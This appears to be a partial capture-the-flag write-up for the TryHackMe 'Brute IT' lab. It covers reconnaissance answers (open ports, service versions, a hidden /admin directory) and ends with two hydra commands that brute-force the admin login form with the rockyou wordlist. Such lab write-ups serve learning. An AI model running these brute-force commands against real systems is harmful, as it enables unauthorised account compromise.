### Brute IT

export IP=10.10.166.204

In this box you will learn about:

- Brute-force

- Hash cracking

- Privilege escalation

Connect to the TryHackMe network, and deploy the machine.

####  Reconnaissance

Before attacking, let's get information about the target

Search for open ports using nmap.
How many ports are open?
- 2

What version of SSH is running?
- OpenSSH 7.6p1

What version of Apache is running?
- 2.4.29

Which Linux distribution is running?
- Ubuntu

![](../../img/Pasted%20image%2020220828045234.png)



Search for hidden directories on web server.
What is the hidden directory?
- /admin

![](../../img/Pasted%20image%2020220828045211.png)


hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.166.204 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:F=incorrect" -V         

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.166.204 http-post-form “/admin/index.php:user=^USER^&pass=^PASS^:F=Username or password invalid” -V